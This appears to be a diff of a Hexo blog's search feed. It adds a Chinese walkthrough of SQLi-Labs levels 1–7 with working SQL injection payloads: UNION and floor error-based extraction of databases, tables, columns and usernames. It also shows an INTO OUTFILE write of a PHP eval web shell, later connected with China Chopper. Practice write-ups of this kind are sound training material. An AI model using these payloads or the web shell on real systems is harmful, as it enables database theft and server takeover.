@@ -98,7 +98,7 @@
 <img src="/2019/11/18/hexo主题个人优化/timg20.PNG">
 
 
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>以上就是我的hexo配置。在文件位置中/blog/为自己搭建hexo的根目录，其余在css中提到的修改，如果没有找到对应语句，可自行添加。在next主题7.x中css文件下没有_custom/custom.styl，可以自行创建文件，并在在./blog/themes/next/source/css/main.styl末尾加入 @import “_custom/custom.styl”; 引用即可</p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>以上就是我的hexo配置。在文件位置中/blog/为自己搭建hexo的根目录，其余在css中提到的修改，如果没有找到对应语句，可自行添加。在next主题7.x中css文件下没有_custom/custom.styl，可自行创建文件，并在<br>在./blog/themes/next/source/css/main.styl末尾加入 @import “_custom/custom.styl”; 引用即可</p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -111,55 +111,101 @@
   <entry>
     <title>SQLi-Labs过关笔记</title>
     <url>/2019/11/17/SQLi-Labs/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SQLi-Labs是某印度程序猿开发的一套练习SQL注入的靶场，共计60关。难度从浅入深，饱受各大安全爱好者，从业者喜爱，是练习sql注入非常不错的途径。</p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SQLi-Labs是某印度程序猿开发的一套练习SQL注入的靶场，共计65关。难度从浅入深，涉及多种sql注入方法</p>
 <p>原项目地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
-<p>本篇将逐步上传已经完成关卡的攻略过程，以及更新未完成的攻略。<br>以每10关为一大标题，每关为一小标题的形式，方便目录定位及阅览。</p>
+<p>本篇将逐步上传已经完成关卡的攻略过程，以及更新未完成的攻略。</p>
 <a id="more"></a>
 
 <h1 id="Less1-Less10"><a href="#Less1-Less10" class="headerlink" title="Less1-Less10"></a>Less1-Less10</h1><h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>1、首先已经判断出是 ‘ 闭合，order by判断字段数，从下图可见 3正确4错误 </p>
 <p>-1’order by 3–+</p>
-<img src="/2019/11/17/SQLi-Labs/timg1.PNG" title="timg">
-<img src="/2019/11/17/SQLi-Labs/timg2.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg1.PNG">
+<img src="/2019/11/17/SQLi-Labs/timg2.PNG">
 
 <p>2、接下来联合查询看回显，得到数据库和用户</p>
 <p>-1’ union select 1,databse(),user()–+</p>
-<img src="/2019/11/17/SQLi-Labs/timg3.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg3.PNG">
 
 <p>3、爆表名</p>
 <p>-1’ union select 1,2,table_name from information_schema.tables<br>where table_schema=database()–+</p>
-<img src="/2019/11/17/SQLi-Labs/timg4.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg4.PNG">
 
 <p>4、爆出users中的列名</p>
 <p>-1’ union select 1,2,column_name from information_schema.columns<br>where table_name=’users’–+</p>
-<img src="/2019/11/17/SQLi-Labs/timg5.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg5.PNG">
 
 <p>5、爆出username，同理可爆出password，less1结束</p>
-<img src="/2019/11/17/SQLi-Labs/timg6.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg6.PNG">
 
 
 <h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>1、判断闭合，发现加入单引号或双引号提示数据库语句错误，最后确定是没有闭合的常规数字型注入</p>
-<img src="/2019/11/17/SQLi-Labs/timg7.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg7.PNG">
 
 <p>2、之后的过程同less1一样，不再重复描述，less2结束</p>
 <h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>1、判断闭合，加入单引号，发现报错。 可以通过报错判断出，是 ‘) 闭合</p>
-<img src="/2019/11/17/SQLi-Labs/timg8.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg8.PNG">
 
 <p>2、看回显，没问题，之后的过程同less1一样，不再重复描述，less3结束</p>
-<img src="/2019/11/17/SQLi-Labs/timg9.PNG" title="timg">
+<img src="/2019/11/17/SQLi-Labs/timg9.PNG">
 
-<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>1、判断闭合，加入’发现没有报错，加入”报错，通过报错可以判断，是”）闭合</p>
-<img src="/2019/11/17/SQLi-Labs/timg10.PNG" title="timg">
+<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>1、闭合，加入’发现没有报错，加入”报错，通过报错可以判断，是”）闭合判断</p>
+<img src="/2019/11/17/SQLi-Labs/timg10.PNG">
 
 <p>2、看回显，没问题，之后过程同less1一样，不再重复描述，less4结束</p>
-]]></content>
+<img src="/2019/11/17/SQLi-Labs/timg11.PNG">
+
+<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>1、判断闭合，加入’发现报错，加入”没有报错，接着”and1=2–+ 发现没报错,-1”union select 1,2,3 –+无回显，所以猜测使用报错注入</p>
+<img src="/2019/11/17/SQLi-Labs/timg12.PNG">
+
+<p>常用报错注入有三种：floor报错，updatexml报错，extractvalue报错<br>这里使用floor报错 ‘ 闭合</p>
+<p>2、爆库</p>
+<p>通过调整limit达到遍历的效果，找到需要的库<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select schema_name from information_schema.schemata limit 8,1),0x7e,floor(rand(0)*2))–+</p>
+<img src="/2019/11/17/SQLi-Labs/timg13.PNG">
+
+<p>3、爆表</p>
+<p>同理可调整limit遍历出需要的表users<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e,floor(rand(0)*2))–+</p>
+<img src="/2019/11/17/SQLi-Labs/timg14.PNG">
+
+
+<p>4、爆列</p>
+<p>调整limit遍历出 id,username,password<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database() group by concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 2,1),0x7e,floor(rand(0)*2))–+</p>
+<img src="/2019/11/17/SQLi-Labs/timg15.PNG">
+
+<p>5、爆数据</p>
+<p>调整列名以及limit遍历出对应列下面的数据<br>?id=-1’union select 1,2,count(* ) from information_schema.tables where table_schema=database()  group by concat(0x7e,(select username from users limit 1,1),0x7e,floor(rand(0)*2))–+</p>
+<p>less5结束</p>
+<img src="/2019/11/17/SQLi-Labs/timg16.PNG">
+
+<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>根据主页less6的名称可以知道是 “ 闭合，剩下步骤同less5，不再描述，less6结束</p>
+<img src="/2019/11/17/SQLi-Labs/timg17.PNG">
+
+<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>less7的标题是这样描述的 dump into outfile 提示我们写入外部文件<br>需要利用数据库的into outfile 命令</p>
+<p>1、通过尝试发现是 ‘))闭合，然后用以下命令写入文件，并加入一句话木马</p>
+<p>?id=-1’))  union select 1,”<?php @eval($_POST['eval']);?>“,3 into outfile “D:\phpStudy\PHPTutorial\WWW\less7.php” –+</p>
+<img src="/2019/11/17/SQLi-Labs/timg18.PNG">
+
+<p>完成后因为条件允许，所以可以去本地目录验证一下</p>
+<img src="/2019/11/17/SQLi-Labs/timg19.PNG">
+
+<p>很好，可以看见这里没有写入的less7.php，找一找问题出在哪里。检查语法，检查mysql，都没有问题。估计是权限的问题，然后经过一番询问和百度，找到了原因。在mysql配置文件my.ini下有一个参数，secure-file-priv。由于启动mysql的时候使用了secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFILE之类文件的目录位置。我的my.ini中没有找到这个参数，不要紧，手动添加secure-file-priv = “”</p>
+<pre><code>其中当参数 secure_file_priv 为空时，对导入导出无限制
+当值为一个指定的目录时，只能向指定的目录导入导出
+当值被设置为NULL时，禁止导入导出功能</code></pre><p>关于mysqlsecure-file-priv权限的详细解答：<br><a href="https://blog.csdn.net/bnxf00000/article/details/64123549" target="_blank" rel="noopener">https://blog.csdn.net/bnxf00000/article/details/64123549</a></p>
+<p>2、重启mysql,重新写入并验证,成功</p>
+<img src="/2019/11/17/SQLi-Labs/timg20.PNG">
+
+<p>3、上菜刀连接</p>
+<p>结果如图，less7结束</p>
+<img src="/2019/11/17/SQLi-Labs/timg21.PNG">
+
+<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2>]]></content>
       <categories>
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -287,9 +333,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
+        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
@@ -318,9 +364,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
+        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
@@ -363,9 +409,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
+        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
@@ -402,10 +448,10 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -439,10 +485,10 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -491,10 +537,10 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>靶场练习</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -710,8 +756,8 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
       </categories>
       <tags>
         <tag>Web</tag>
-        <tag>信息搜集</tag>
         <tag>社工</tag>
+        <tag>信息搜集</tag>
       </tags>
   </entry>
   <entry>
@@ -777,9 +823,9 @@ myqr.run(
         <category>Web</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-        <tag>Web渗透</tag>
         <tag>sql注入</tag>
+        <tag>Web渗透</tag>
+        <tag>Web</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
